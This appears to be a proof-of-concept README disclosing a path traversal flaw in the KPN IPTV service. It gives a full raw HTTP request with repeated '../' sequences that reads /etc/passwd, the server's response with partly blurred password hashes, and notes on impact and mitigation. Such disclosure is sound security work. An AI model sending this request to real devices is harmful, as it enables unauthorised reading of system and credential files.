# KPN-FilePathTraversal-POC-2023

# KPN ITV File Path Traversal Vulnerability

This repository explains a **file path traversal vulnerability** in the KPN IPTV service, allowing unauthorized access to sensitive system files, such as `/etc/passwd`.

---

## Vulnerability Overview

A **path traversal** (or directory traversal) attack occurs when an attacker manipulates the URL path to access directories and files outside the intended web directory. By using sequences like `../../`, an attacker can navigate up the directory structure and potentially access sensitive files.

---

## Example Attack Flow

### URL:
```plaintext
http://192.168.2.2:8081/Service/Controller/UI?ip=192.168.2.2&port=8081

This is the base URL of the KPN IPTV service.
Malicious Request:

http

GET /Service/Controller/UI../../../../../../../../../../../../../../../../etc/passwd?ip=192.168.2.x&port=8081 HTTP/1.1
Host: 192.168.2.x:8081
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

In this request, the attacker exploits path traversal to reach the /etc/passwd file. This is done by adding multiple instances of ../, which moves up the directory structure.
Burp Suite Response

The server responds with a 200 OK status and the contents of the /etc/passwd file, including sensitive information. The hashes in the response below have been blurred for privacy:

plaintext

HTTP/1.1 200 OK
Content-Type: unknown
Content-Length: 940

root:$5$96bRk************$uTSh**************RLdK1ND*********/XLWC:0:0:root:/home/root:/bin/sh
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:*:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
ntpd:x:1001:65534:Linux User,,,:/var/shared/empty:/bin/sh
utc:$5$qkymr************$M1qu**************JoEifmNs********AiybaC:1000:1000:utc:/home/utc:/bin/sh

Explanation of /etc/passwd

The /etc/passwd file stores essential user account information for a Unix-based system. It typically includes the following information:

    Username
    Password hash (if present)
    User ID (UID)
    Group ID (GID)
    Home directory
    Shell

While modern systems store password hashes in the /etc/shadow file, /etc/passwd can still leak important information, especially for attackers targeting system accounts.
Impact

    Information Disclosure: Attackers can access sensitive files like /etc/passwd, revealing system user information.
    Potential Exploitation: With access to password hashes, attackers can attempt password cracking or gain unauthorized system access.

Mitigation

    Input Validation: Ensure all user inputs are validated and sanitized to prevent malicious sequences like ../.
    Restrict Directory Access: Configure the web server to limit access to sensitive directories.
    Use Web Application Firewalls (WAFs): A WAF can help detect and block suspicious URL patterns associated with path traversal attacks.

Conclusion

Path traversal vulnerabilities can lead to severe data exposure and compromise system integrity. This example from the KPN IPTV service demonstrates how improper input validation can open the door to sensitive information leakage. Always implement strong security measures to mitigate such risks.
